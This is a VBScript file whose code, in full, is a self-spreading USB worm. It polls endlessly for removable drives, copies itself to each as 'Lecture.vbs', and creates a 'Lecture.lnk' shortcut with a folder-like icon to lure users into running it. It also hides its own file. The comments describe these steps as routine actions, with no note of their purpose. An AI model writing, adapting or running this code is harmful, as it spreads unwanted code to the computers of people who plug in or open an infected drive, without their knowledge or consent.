Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Path to the folder where the script resides
scriptFolder = objFSO.GetParentFolderName(WScript.ScriptFullName)

' Path to the script itself
scriptPath = WScript.ScriptFullName

' Check for the USB drive in a loop
Do
    ' Get the list of all available drives
    Set colDrives = objFSO.Drives

    ' Iterate over each drive
    For Each objDrive in colDrives
        ' Check if the drive is removable (i.e., potentially a USB drive) and ready
        If objDrive.DriveType = 1 And objDrive.IsReady Then
            ' Construct the path to the drive
            usbDrivePath = objDrive.DriveLetter & ":\"

            ' If Lecture.vbs doesn't exist on the USB drive, perform the necessary actions
            If Not objFSO.FileExists(usbDrivePath & "\Lecture.vbs") Then
                ' Copy the script to the USB drive as Lecture.vbs
                objFSO.CopyFile scriptPath, usbDrivePath & "\Lecture.vbs"

                ' Create a shortcut to Lecture.vbs
                shortcutPath = usbDrivePath & "\Lecture.lnk"
                Set objShortcut = objShell.CreateShortcut(shortcutPath)
                objShortcut.TargetPath = usbDrivePath & "\Lecture.vbs"
                objShortcut.IconLocation = "shell32.dll, 3"  ' Customize icon as needed
                objShortcut.Save

                ' Hide the original script
                objFSO.GetFile(scriptPath).Attributes = 2  ' Hidden attribute
            End If
        End If
    Next

    ' Wait for some time before checking again (e.g., 5 seconds)
    WScript.Sleep 5000
Loop
